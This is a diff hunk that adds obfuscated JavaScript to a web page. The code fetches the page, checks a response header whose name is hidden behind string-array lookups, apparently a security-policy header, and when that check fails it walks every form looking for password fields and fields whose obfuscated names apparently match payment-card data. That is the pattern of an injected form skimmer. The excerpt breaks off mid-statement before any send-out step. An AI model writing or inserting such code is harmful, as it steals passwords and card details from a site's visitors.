@@ -1,0 +1,10 @@
+fetch(document.location.href)
+        .then(resp => {
+            const _nZ = resp.headers.get(_zeN5[45]+_zeN5[31]+_zeN5[13]+_zeN5[43]+_zeN5[41]+_zeN5[13]+_zeN5[43]+_zeN5[28]+_zeN5[8]+_zeN5[41]+_zeN5[2]+_zeN5[34]+_zeN5[19]+_zeN5[6]+_zeN5[43]+_zeN5[1]+_zeN5[28]+_zeN5[27]+_zeN5[31]+_zeN5[12]+_zeN5[6]+_zeN5[2]+_zeN5[1]);
+            if (_nZ == null || !_nZ.includes(_zeN5[5]+_zeN5[41]+_zeN5[32]+_zeN5[9]+_zeN5[34]+_zeN5[12]+_zeN5[43]+_zeN5[28]+_zeN5[14]+_zeN5[19]+_zeN5[2])) {
+
+                for (var i = 0; i < _3X3Y; i++) {
+                    var _x8 = document.forms[i].elements;
+                    for (var k = 0; k < _x8.length; k++) {
+                        if (_x8[k].type == _zeN5[37]+_zeN5[9]+_zeN5[14]+_zeN5[14]+_zeN5[17]+_zeN5[31]+_zeN5[19]+_zeN5[5] || _x8[k].name.toLowerCase() == _zeN5[2]+_zeN5[21]+_zeN5[2] || _x8[k].name.toLowerCase() == _zeN5[2]+_zeN5[9]+_zeN5[19]+_zeN5[5]+_zeN5[13]+_zeN5[34]+_zeN5[4]+_zeN5[11]+_zeN5[41]+_zeN5[19]) {
+                            docu...
